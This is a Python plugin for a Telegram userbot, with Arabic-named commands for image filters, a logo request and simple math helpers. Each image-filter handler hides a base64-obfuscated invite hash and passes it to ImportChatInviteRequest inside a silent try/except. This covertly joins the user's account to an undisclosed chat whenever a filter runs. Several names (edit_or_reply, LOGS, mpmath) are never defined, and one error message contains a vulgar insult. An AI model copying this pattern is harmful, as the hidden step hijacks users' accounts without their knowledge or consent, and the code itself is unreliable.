import asyncio
import os
import random
import shlex
import math
import asyncio
from userbot.utils.decorators import register
from . import ALIVE_NAME, AUTONAME, BOTLOG, BOTLOG_CHATID, DEFAULT_BIO, get_user_from_event

from telethon.errors.rpcerrorlist import YouBlockedUserError
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from userbot.utils import admin_cmd, sudo_cmd, eor
from userbot import iqthon
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)
from userbot.helpers.utils.tools import take_screen_shot
async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@iqthon.on(admin_cmd(pattern="عكس الالوان$", outgoing=True))
@iqthon.on(sudo_cmd(pattern="عكس الالوان$", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="فلتر احمر$"))
@iqthon.on(sudo_cmd(pattern="فلتر احمر$", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="يمين الصوره$"))
@iqthon.on(sudo_cmd(pattern="يمين الصوره$", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@iqthon.on(admin_cmd(outgoing=True, pattern=r"^\.wlogo(?: |$)(.*)"))
async def _(event):
    aing = await event.client.get_me()
    text = event.pattern_match.group(1)
    if not text:
        await event.edit("`Give a name too!`")
    else:
        await event.edit("`Processing`")
    chat = "@KazukoRobot"
    async with event.client.conversation(chat) as conv:
        try:
            msg = await conv.send_message(f"/logo {text}")
            response = await conv.get_response()
            logo = await conv.get_response()
            """ - don't spam notif - """
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit(
                "**Error: Mohon Buka Blokir** @KazukoRobot **Dan Coba Lagi Kontol!**"
            )
            return
        await asyncio.sleep(0.5)
        await event.client.send_file(
            event.chat_id,
            logo,
            caption=f"Logo by [{ALIVE_NAME}](tg://user?id={aing.id})",
        )
        await event.client.delete_messages(conv.chat_id, [msg.id, response.id, logo.id])
        await event.delete()
@iqthon.on(admin_cmd(outgoing=True, pattern="قلب الصوره$"))
@iqthon.on(sudo_cmd(pattern="قلب الصوره$", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="فلتر رصاصي$"))
@iqthon.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="زوم ?(.*)"))
@iqthon.on(sudo_cmd(pattern="زوم ?(.*)", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiainput = mafia.pattern_match.group(1)
    mafiainput = 50 if not mafiainput else int(mafiainput)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, mafiainput)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(
            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="اطار ?(.*)"))
@iqthon.on(sudo_cmd(pattern="اطار ?(.*)", allow_sudo=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiainput = mafia.pattern_match.group(1)
    if not mafiainput:
        mafiainput = 50
    if ";" in str(mafiainput):
        mafiainput, colr = mafiainput.split(";", 1)
    else:
        colr = 0
    mafiainput = int(mafiainput)
    colr = int(colr)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, mafiainput, colr)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(
            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@iqthon.on(admin_cmd(pattern="sin ?(.*)"))
@iqthon.on(sudo_cmd(pattern="sin ?(.*)", allow_sudo=True))
async def findsin(event):
    input_str = int(event.pattern_match.group(1))
    output = math.sin(input_str)
    await event.edit(f"**Value of Sin** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="cos ?(.*)"))
@iqthon.on(sudo_cmd(pattern="cos ?(.*)", allow_sudo=True))
async def find_cos(event):
    input_str = int(event.pattern_match.group(1))
    output = math.cos(input_str)
    await event.edit(f"**Value of Cos** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="tan ?(.*)"))
@iqthon.on(sudo_cmd(pattern="tan ?(.*)", allow_sudo=True))
async def find_tan(event):
    input_str = int(event.pattern_match.group(1))
    output = math.tan(input_str)
    await event.edit(f"**Value of Tan** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="cosec ?(.*)"))
@iqthon.on(sudo_cmd(pattern="cosec ?(.*)", allow_sudo=True))
async def find_csc(event):
    input_str = float(event.pattern_match.group(1))
    output = mpmath.csc(input_str)
    await event.edit(f"**Value of Cosec** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="sec ?(.*)"))
@iqthon.on(sudo_cmd(pattern="sec ?(.*)", allow_sudo=True))
async def find_sec(event):
    input_str = float(event.pattern_match.group(1))
    output = mpmath.sec(input_str)
    await event.edit(f"**Value of Sec** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="cot ?(.*)"))
@iqthon.on(sudo_cmd(pattern="cot ?(.*)", allow_sudo=True))
async def find_cot(event):
    input_str = float(event.pattern_match.group(1))
    output = mpmath.cot(input_str)
    await event.edit(f"**Value of Cot** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="square ?(.*)"))
@iqthon.on(sudo_cmd(pattern="square ?(.*)", allow_sudo=True))
async def square(event):
    input_str = float(event.pattern_match.group(1))
    output = input_str * input_str
    await event.edit(f"**Square of** `{input_str}`\n== `{output}`")


@iqthon.on(admin_cmd(pattern="cube ?(.*)"))
@iqthon.on(sudo_cmd(pattern="cube ?(.*)", allow_sudo=True))
async def cube(event):
    input_str = float(event.pattern_match.group(1))  # DANGEROUSJATT
    output = input_str * input_str * input_str
    await event.edit(f"**Cube of** `{input_str}`\n== `{output}`")
